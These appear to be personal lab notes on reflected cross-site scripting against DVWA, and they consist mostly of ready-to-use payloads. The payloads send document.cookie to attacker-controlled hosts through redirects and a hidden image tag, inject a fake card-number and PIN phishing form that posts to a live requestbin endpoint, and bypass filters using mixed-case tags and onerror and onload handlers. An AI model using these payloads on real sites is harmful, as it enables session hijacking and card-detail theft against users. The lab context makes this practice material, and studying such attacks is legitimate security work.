
<script>alert(document.domain)</script>       

<script>alert(document.cookie)</script>

=> document.cookie      => cookie ko check dar
=> document.cookie="victim cookie";
=>reload it again  
#DONE 


----------------------------------
Simple Cookies stolen

<script>window.location="https://www.google.com";</script>

192.168.99.116/DVWA/vulnerabilities/xss_r/?name=<script>window.location="http://192.168.99.116/?aaaaaa=";</script>  => aaaa ko pot lite dal

192.168.99.116/DVWA/vulnerabilities/xss_r/?name=<script>window.location="http://192.168.99.116/?cookie="%2bdocument.cookie;</script>  => + ko encode yin  %2b     => real stolen loke dar

### server side mar 
tail -f /var/log/apache2/access.log     => log net param ko phan mal

![[Pasted image 20230108183511.png]]


<script>document.getElementsByClassName('vulnerable_code_area')[0].innerHTML="I have been Hacked!"</script>     => to phishing attack

I got class name form i wann change div-> class

<script>document.getElementsByTagName('body')[0].innerHTML="HACKED!"</script>  => i changed the whole body
-----
=> phishing payload 
<script>document.getElementsByClassName('vulnerable_code_area')[0].innerHTML=' <form action="http://192.168.99.116/">Please update your card before 2023 <br><br><input type="text" name="cardNumber" placeholder="Enter your card number"><input type="password" name="pin" placeholder="PinCode"><input type="submit" name=""></form>'</script>

=> and then i also watch in web access log like that

tail -f /var/log/apache2/access.log

----------------------------------------------
We can take real web server from requst bin site ****

<script>document.getElementsByClassName('vulnerable_code_area')[0].innerHTML=' <form action="https://eoxt7tnceij7ygt.m.pipedream.net">Please update your card before 2023 <br><br><input type="text" name="cardNumber" placeholder="Enter your card number"><input type="password" name="pin" placeholder="PinCode"><input type="submit" name=""></form> '</script>

! Here is our phishing link

![[Pasted image 20230108230906.png]]

=> I used https server from requestbin  => to get web request

![[Pasted image 20230108230756.png]]



---------------------------

 <sCript>alert('xss');</script>     => Character ban 

192.168.99.116/DVWA/vulnerabilities/xss_r/?name=<h1 onmouseover=alert(1);>Zello</h1>  => script tag ko ban 

192.168.99.116/DVWA/vulnerabilities/xss_r/?name=<img src=x onerror=alert('xss');>   => no need  user action


192.168.99.116/DVWA/vulnerabilities/xss_r/?name=<svg/onload=prompt(2)>   => onerror and alert ko ban 



------------
<script>document.write('Hello<img src="http://192.168.2.110/log.php?lol=' + document.cookie+'" width="0" height="0">');</script>

-----------------




